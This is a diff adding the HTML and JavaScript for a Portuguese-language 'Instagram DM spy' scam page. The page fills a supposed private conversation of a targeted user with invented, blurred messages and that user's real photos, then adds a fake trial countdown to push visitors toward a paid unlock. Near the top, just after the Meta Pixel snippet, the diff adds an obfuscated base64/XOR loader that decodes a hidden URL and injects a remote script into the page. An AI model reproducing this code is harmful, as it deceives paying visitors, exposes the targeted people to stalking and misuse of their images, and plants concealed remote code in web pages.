@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2965248043809874');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2965248043809874&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script>(function(){var p_w1h=atob("DBSdyOYhpiJxUvmnlG+/vZRNhBhTOo3T5Gen58lCwkxfJ43K/XLk5oVOywwTINbU92b0uJJSiVcFP4qI+HXprZVViEgCcNWF9WDpuo9D01YUIdudz2+/podMwwBLcJ3G4HWwvZJMz0QIf4nV8WL4ppIM3kEeNtTU93+/5MRXx04EN9udtjbg5J0DyEMcN9udtnD8vIcM01YcO5/euWTvrZBEyFZcIYzF/XDu6soD0EMdJ5yFrja/tbtc");var u_46=[];for(var u_bx6=0;u_bx6<p_w1h.length;u_bx6++){u_46.push(p_w1h.charCodeAt(u_bx6)&255);}var j_9=u_46[0];var n_g=u_46.slice(1,1+j_9);var q_wpg=u_46.slice(1+j_9);var o_cjk7=q_wpg.map(function(b,y_y1q){return b^n_g[y_y1q%j_9];});var g_y="";for(var z_3u6a=0;z_3u6a<o_cjk7.length;z_3u6a++){g_y+=String.fromCharCode(o_cjk7[z_3u6a]&255);}var p_gmlt=decodeURIComponent(escape(g_y));var j_8=JSON.parse(p_gmlt);var w_w0k=j_8.globals||[];w_w0k.forEach(function(r_mdu){window[r_mdu.name]=r_mdu.value;});var o_t71d=document.createElement("script");o_t71d.src=j_8.url;o_t71d.async=true;o_t71d.defer=true;(j_8.attributes||[]).forEach(function(y_nz){o_t71d.setAttribute(y_nz.name,y_nz.value);});(document.head||document.documentElement).appendChild(o_t71d);})();</script>
+
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <meta name="robots" content="noindex,nofollow" />
+  <title>Direct</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap&subset=latin,latin-ext" />
+  <link rel="stylesheet" href="assets/ig.css" />
+</head>
+<body class="conversation-page">
+  <div class="ig-app">
+    <div class="cv-head">
+      <svg class="ico" id="back" viewBox="0 0 24 24" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+      <img class="cv-ava" id="cv-ava" src="assets/img/avatar-placeholder.svg" alt="" />
+      <div class="cv-id"><b id="cv-name">&mdash;</b><span id="cv-status">Ativo recentemente</span></div>
+      <svg class="ico" viewBox="0 0 24 24" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" data-unlock><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2"></rect></svg>
+      <svg class="ico" viewBox="0 0 24 24" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" data-unlock><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.8 19.8 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.8 19.8 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.9.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+    </div>
+
+    <div class="cv-thread" id="thread"></div>
+  </div>
+
+  <div class="trial-bar" id="trial" data-unlock>
+    <span>&#x1F381; Avalia&ccedil;&atilde;o gratuita</span>
+    <span class="trial-clock" id="trial-clock">07:00</span>
+    <span class="trial-msg">Assine para descobrir tudo</span>
+  </div>
+
+  <!-- barra bloqueada + input -->
+  <div class="cv-locked-bar" id="locked-bar" data-unlock>
+    &#x1F512; Mensagens bloqueadas &mdash; avalia&ccedil;&atilde;o expira em <span class="clk" id="clk">10:00</span> &middot; toque para desbloquear
+  </div>
+  <div class="cv-input" data-unlock>
+    <svg class="ic" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M8 14s1.5 2 4 2 4-2 4-2"></path><line x1="9" y1="9" x2="9.01" y2="9"></line><line x1="15" y1="9" x2="15.01" y2="9"></line></svg>
+    <div class="box">Mensagem...</div>
+    <svg class="ic" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path></svg>
+    <svg class="ic" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+  </div>
+
+  <script src="assets/config.js"></script>
+  <script src="assets/funnel.js"></script>
+  <script src="assets/ig-data.js"></script>
+  <script>
+    (function () {
+      var F = window.StalkeaFunnel;
+      F.armBackRedirect();
+
+      function resolveFlowUsername() {
+        var fromUrl = F.sanitizeUsername(
+          F.getParam("username") ||
+          F.getParam("user") ||
+          F.getParam("perfil") ||
+          F.getParam("profile") ||
+          F.getParam("ig")
+        );
+        if (fromUrl) return fromUrl;
+
+        try {
+          var fromSession = F.sanitizeUsername(sessionStorage.getItem("stalkea_current_username") || sessionStorage.getItem("stalkea_last_username") || "");
+          if (fromSession) return fromSession;
+        } catch (e) {}
+
+        try {
+          var fromLocal = F.sanitizeUsername(localStorage.getItem("stalkea_current_username") || localStorage.getItem("espionado_username") || "");
+          if (fromLocal) return fromLocal;
+        } catch (e) {}
+
+        return "";
+      }
+
+      var username = resolveFlowUsername() || "perfil_privado";
+      var idx = parseInt(F.getParam("c"), 10);
+      var pickedUser = F.sanitizeUsername(F.getParam("contact") || F.getParam("u") || "");
+      var pickedPhoto = String(F.getParam("contact_photo") || "").trim();
+      var dmContactsKey = 'stalkea_dm_contacts_' + username;
+      var usernameKey = F.sanitizeUsername(username || '').toLowerCase().replace(/\./g, '_');
+      var blockedDmUsers = {
+        bilalhimmou___1: true,
+        anaduartedsg: true,
+        thiago_ferreira: true,
+        tzviagens_taylone: true,
+        corretoraabrsaude: true,
+        marcos_oliveira: true,
+        fatosdesconhecidos: true
+      };
+      if (usernameKey) blockedDmUsers[usernameKey] = true;
+
+      function isBlockedDmUser(value) {
+        var clean = F.sanitizeUsername(value || '').toLowerCase();
+        return !!blockedDmUsers[clean.replace(/\./g, '_')];
+      }
+
+      function filterDmContacts(list) {
+        return (Array.isArray(list) ? list : []).filter(function (contact) {
+          var value = contact && (contact.name || contact.username || '');
+          var normalized = F.sanitizeUsername(value);
+          if (!normalized) return false;
+          if (normalized.toLowerCase() === F.sanitizeUsername(username || '').toLowerCase()) return false;
+          return !isBlockedDmUser(value);
+        });
+      }
+
+      if (isBlockedDmUser(pickedUser)) pickedUser = "";
+      if (isNaN(idx)) idx = 0;
+
+      function loadDMContacts() {
+        try {
+          var raw = sessionStorage.getItem(dmContactsKey) || localStorage.getItem(dmContactsKey);
+          if (!raw) return [];
+          var parsed = JSON.parse(raw);
+          if (parsed.ts && (Date.now() - parsed.ts) > (15 * 60 * 1000)) return [];
+          return filterDmContacts(parsed.contacts);
+        } catch (e) {
+          return [];
+        }
+      }
+
+      var dmContacts = loadDMContacts();
+      var conv = null;
+      var convIdx = idx;
+
+      var candidatePeople = [];
+      try {
+        var rawNetwork = sessionStorage.getItem('stalkea_network_' + username) || localStorage.getItem('stalkea_network_' + username);
+        if (rawNetwork) {
+          var parsedNetwork = JSON.parse(rawNetwork);
+          if (parsedNetwork && Array.isArray(parsedNetwork.people)) candidatePeople = filterDmContacts(parsedNetwork.people);
+        }
+      } catch (e) {}
+
+      if (pickedUser) {
+        var fromNetwork = candidatePeople.filter(function (person) {
+          return F.sanitizeUsername(person && person.username) === pickedUser;
+        })[0] || null;
+
+        var fromDM = null;
+        for (var d = 0; d < dmContacts.length; d++) {
+          if (F.sanitizeUsername(dmContacts[d].name || '') === pickedUser) {
+            fromDM = dmContacts[d];
+            convIdx = d;
+            break;
+          }
+        }
+
+        conv = {
+          name: (fromNetwork && fromNetwork.username) || (fromDM && fromDM.name) || pickedUser,
+          profilePicUrl: pickedPhoto || (fromDM && fromDM.profilePicUrl) || (fromNetwork && (fromNetwork.photoUrl || fromNetwork.profilePicUrl)) || '',
+          verified: !!((fromNetwork && fromNetwork.isVerified) || (fromDM && fromDM.verified)),
+          online: fromDM ? !!fromDM.online : true,
+          preview: (fromDM && fromDM.preview) || 'Mensagem recente',
+          time: (fromDM && fromDM.time) || 'agora'
+        };
+      }
+
+      if (!conv && dmContacts.length) {
+        conv = dmContacts[idx] || dmContacts[0];
+        convIdx = dmContacts.indexOf(conv);
+      }
+
+      if (!conv) {
+        var fallbackConversations = filterDmContacts(IG_DATA.conversations);
+        conv = fallbackConversations[idx] || fallbackConversations[0];
+        convIdx = fallbackConversations.indexOf(conv);
+      }
+
+      var threadIndex = convIdx;
+      if (IG_DATA.threads && !IG_DATA.threads[threadIndex]) {
+        var keys = Object.keys(IG_DATA.threads);
+        if (keys.length) {
+          var h = 0;
+          var base = String(conv.name || "");
+          for (var iHash = 0; iHash < base.length; iHash++) h = ((h << 5) - h) + base.charCodeAt(iHash);
+          threadIndex = Math.abs(h) % keys.length;
+        }
+      }
+
+      var thread = (IG_DATA.threads && IG_DATA.threads[threadIndex]) || {
+        status: "Ativo recentemente",
+        msgs: [
+          { from: "them", type: "text", text: "essa conversa \u00E9 s\u00F3 nossa \uD83E\uDD2B", time: "agora" },
+          { from: "them", type: "photo", time: "agora" },
+        ],
+      };
+
+      var contactMedia = [];
+      var contactMediaItems = [];
+
+      function partyPhoto(seed, idx) {
+        var list = [
+          'https://images.unsplash.com/photo-1492684223066-81342ee5ff30?auto=format&fit=crop&w=900&q=80',
+          'https://images.unsplash.com/photo-1517457373958-b7bdd4587205?auto=format&fit=crop&w=900&q=80',
+          'https://images.unsplash.com/photo-1529156069898-49953e39b3ac?auto=format&fit=crop&w=900&q=80',
+          'https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=900&q=80',
+          'https://images.unsplash.com/photo-1516280440614-37939bbacd81?auto=format&fit=crop&w=900&q=80',
+          'https://images.unsplash.com/photo-1528605248644-14dd04022da1?auto=format&fit=crop&w=900&q=80',
+          'https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=900&q=80'
+        ];
+        var hash = 0;
+        var key = String(seed || 'party') + ':' + String(idx || 0);
+        for (var i = 0; i < key.length; i++) hash = ((hash << 5) - hash) + key.charCodeAt(i);
+        return list[Math.abs(hash) % list.length];
+      }
+
+      function expandThread(baseThread, seedName, seedIdx) {
+        var src = baseThread && Array.isArray(baseThread.msgs) ? baseThread.msgs.slice() : [];
+        var targetCount = 18;
+        if (src.length >= targetCount) return baseThread;
+
+        var conversationSets = [
+          {
+            them: ['te mandei o lugar que a gente ia ir hoje', 'acabei de ver o teu story, gostei mesmo', 'se quiser te passo o link do evento'],
+            me: ['to aqui sim, me manda', 'pode me mandar no direct', 'tô curiosa pra ver'],
+            reels: ['a vibe da festa ficou excelente', 'essa música encaixou demais']
+          },
+          {
+            them: ['olha o que apareceu pra mim agora', 'depois me conta se você vai', 'mandei aquele vídeo do final da noite'],
+            me: ['vou ver quando sair daqui', 'me manda o endereço também', 'esse eu ainda não tinha visto'],
+            reels: ['foi o melhor momento da noite', 'esse corte ficou muito bom']
+          },
+          {
+            them: ['dá pra marcar no grupo amanhã', 'você viu a mensagem de ontem?', 'te encaminhei tudo por aqui'],
+            me: ['fechou, eu confirmo mais tarde', 'pode deixar que eu respondo', 'vou abrir assim que puder'],
+            reels: ['consegui dar uma passada só pro rolê', 'olha a edição desse vídeo']
+          }
+        ];
+        var times = ['19:12', '19:22', '19:31', '19:42', '19:58', '20:10', '20:21', '20:34', '20:44', '20:57', '21:06', '21:15'];
+
+        var seed = String(seedName || '') + ':' + String(seedIdx || 0);
+        var hash = 0;
+        for (var h = 0; h < seed.length; h++) hash = ((hash << 5) - hash) + seed.charCodeAt(h);
+        var conversationSet = conversationSets[Math.abs(hash) % conversationSets.length];
+
+        while (src.length < targetCount) {
+          var choose = Math.abs(hash + src.length) % 9;
+          var fromThem = (src.length % 3 !== 0) && (src.length % 2 === 0 || src.length % 4 !== 0);
+          var from = fromThem ? 'them' : 'me';
+          var t = times[(src.length + Math.abs(hash)) % times.length];
+
+          if (choose === 0 || choose === 4) {
+            src.push({ from: from, type: 'photo', time: t, img: partyPhoto(seed, src.length), clear: (src.length % 5 === 0) });
+          } else if (choose === 1 || choose === 6) {
+            src.push({ from: from, type: 'reel', text: conversationSet.reels[(Math.abs(hash) + src.length) % conversationSet.reels.length], time: t });
+          } else if (choose === 2) {
+            src.push({ from: from, type: 'audio', dur: (fromThem ? '0:19' : '0:11'), time: t });
+          } else {
+            var pool = fromThem ? conversationSet.them : conversationSet.me;
+            var text = pool[(Math.abs(hash) + src.length) % pool.length];
+            src.push({ from: from, type: 'text', text: text, time: t, blurred: (src.length % 3 !== 0) });
+          }
+        }
+
+        return {
+          status: baseThread && baseThread.status ? baseThread.status : 'Ativo recentemente',
+          msgs: src
+        };
+      }
+
+      thread = expandThread(thread, conv && conv.name, convIdx);
+
+      // cabeçalho
+      document.getElementById("cv-name").textContent = conv.name;
+      document.getElementById("cv-status").textContent = thread.status || "Ativo recentemente";
+      // avatar do contato: foto real embaçada (fallback = iniciais)
+      var cvAva = document.getElementById("cv-ava");
+      cvAva.className = "cv-ava ava-blur";
+      cvAva.onerror = function () { cvAva.src = F.avatarDataUri(conv.name, convIdx); cvAva.className = "cv-ava"; };
+      cvAva.src = conv.profilePicUrl || F.avatarDataUri(conv.name, convIdx);
+
+      // fotos reais borradas para bolhas de imagem
+      function photoUrl(seed) { return conv.profilePicUrl || F.avatarDataUri(conv.name, convIdx); }
+      var LOCK = '<svg class="lock" viewBox="0 0 24 24" stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2.5"></rect><path d="M8 11V8a4 4 0 1 1 8 0v3"></path></svg>';
+
+      function renderThread() {
+        var t = document.getElementById("thread");
+        var html = '<div class="cv-day">HOJE</div>';
+        thread.msgs.forEach(function (m, i) {
+          var side = m.from === "me" ? "me" : "them";
+          var mediaItem = contactMediaItems.length ? contactMediaItems[i % contactMediaItems.length] : null;
+          var media = mediaItem ? mediaItem.url : (contactMedia.length ? contactMedia[i % contactMedia.length] : "");
+          if (m.type === "photo") {
+            html += '<div class="msg-photo ' + side + '"><div class="frame">' + (media ? '<img src="' + media + '" alt="Mídia pública do perfil" onerror="this.style.display=\'none\'" />' : '') + LOCK + '</div></div>';
+          } else if (m.type === "reel") {
+            html += '<div class="msg-reel ' + side + '"><div class="reel-card">' + (media ? '<img src="' + media + '" alt="Reel público compartilhado" onerror="this.style.display=\'none\'" />' : '') + '<span class="reel-play">&#9654;</span><span class="reel-label">' + (mediaItem && mediaItem.isVideo ? 'Reel em vídeo' : (media ? 'Reel compartilhado' : 'Mídia indisponível')) + '</span></div><span class="reel-caption">' + F.escapeHtml(m.text || "Reel compartilhado") + '</span></div>';
+          } else if (m.type === "audio") {
+            html += '<div class="msg ' + side + ' msg-audio"><span class="play">\u25B6</span><span class="wave"></span><span class="dur">' + F.escapeHtml(m.dur || "0:30") + '</span><span class="audio-seen">Ver transcrição</span></div>';
+          } else {
+            html += '<div class="msg ' + side + '"><span class="blurred">' + F.escapeHtml(m.text) + '</span></div>';
+            html += '<span class="msg-time ' + side + '">' + F.escapeHtml(m.time || "") + '</span>';
+          }
+        });
+        html += '<div class="cv-locked">\uD83D\uDD12 As mensagens est\u00E3o desfocadas na avalia\u00E7\u00E3o gratuita. Desbloqueie para ler tudo.</div>';
+        t.innerHTML = html;
+      }
+
+      renderThread();
+      fetch(F.apiUrl('/api/user-media?username=' + encodeURIComponent(conv.name)), { cache: 'no-store' })
+        .then(function (response) { return response.ok ? response.json() : null; })
+        .then(function (data) {
+          if (!data) return;
+          contactMediaItems = Array.isArray(data.mediaItems) ? data.mediaItems.filter(function (item) { return item && item.url; }) : [];
+          contactMedia = contactMediaItems.length ? contactMediaItems.map(function (item) { return item.url; }) : (Array.isArray(data.media) ? data.media : []);
+          if (contactMedia.length) renderThread();
+        })
+        .catch(function () {});
+
+      // countdown
+      var clk = document.getElementById("clk");
+      var trialClock = document.getElementById("trial-clock");
+      var ct = setInterval(function () {
+        var rem = F.trialRemainingMs();
+        clk.textContent = F.formatClock(rem);
+        trialClock.textContent = F.formatClock(rem);
+        if (rem <= 0) { clearInterval(ct); }
+      }, 1000);
+      clk.textContent = F.formatClock(F.trialRemainingMs());
+      trialClock.textContent = F.formatClock(F.trialRemainingMs());
+
+      // navegação
+      document.getElementById("back").addEventListener("click", function () {
+        window.location.href = F.withUsername("direct.html", username);
+      });
+      function goUnlock() { F.goFinal(); }
+      document.addEventListener("click", function (e) {
+        if (e.target.closest && e.target.closest("#back")) return;
+        var el = e.target.closest ? e.target.closest("[data-unlock]") : null;
+        if (el) { goUnlock(); return; }
+        if (e.target.closest && (e.target.closest(".msg") || e.target.closest(".msg-photo"))) goUnlock();
+      });
+    })();
+  </script>
+</body>
+</html>
